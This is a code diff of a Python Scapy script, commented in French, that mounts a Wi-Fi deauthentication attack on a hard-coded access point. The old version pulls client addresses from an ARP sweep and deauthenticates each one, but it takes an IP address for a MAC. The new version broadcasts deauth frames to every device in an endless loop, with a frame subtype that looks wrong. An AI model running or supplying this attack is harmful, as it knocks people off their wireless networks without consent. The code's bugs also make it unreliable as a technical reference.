@@ -1,32 +1,17 @@
 from scapy.all import *
-import os
-import time
 
-# Définition des variables
-interface = "wlan1"  # interface réseau à utiliser
-bssid = "08:36:C9:98:11:A9"  # adresse MAC de l'AP cible
+def deauth_all(ap_mac, interface):
+    # Créer un paquet de déauthentification
+    packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac, subtype=0x00)
+    packet /= Dot11Deauth(reason=7)  # 7 = code de raison pour un cadre de classe 3 reçu d'un STA non associé
 
-# Fonction pour changer le canal
-def set_channel(channel):
-    os.system(f"iwconfig {interface} channel {channel}")
+    # Envoyer le paquet en boucle
+    while True:
+        sendp(packet, iface=interface, count=1, verbose=False)
+        print(f"Deauthenticating all devices from {ap_mac}")
 
-# Fonction pour envoyer des paquets de déconnexion
-def deauth(client, bssid):
-    packet = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
-    send(packet, iface=interface, verbose=0)
+# Remplacez par l'adresse MAC du point d'accès et l'interface réseau
+ap_mac = "08:36:C9:98:11:A9"  # MAC du point d'accès
+interface = "wlan1"           # Interface réseau
 
-# Changer le canal à 11 (ou tout autre canal de l'AP)
-set_channel(11)
-
-# Boucle pour déauthentifier tous les clients
-while True:
-    # Scanner pour les clients connectés
-    clients = ARP(pdst=f"192.168.1.0/24")  # Remplacez par le bon sous-réseau
-    ans, _ = sr(clients, timeout=2, verbose=0)
-
-    for _, rcv in ans:
-        client_mac = rcv.psrc  # adresse MAC du client
-        print(f"Déauthentification de {client_mac}")
-        deauth(client_mac, bssid)  # Envoi de paquets de déauthentification
-
-    time.sleep(1)  # Attendre 1 seconde avant de renvoyer des paquets
+deauth_all(ap_mac, interface)
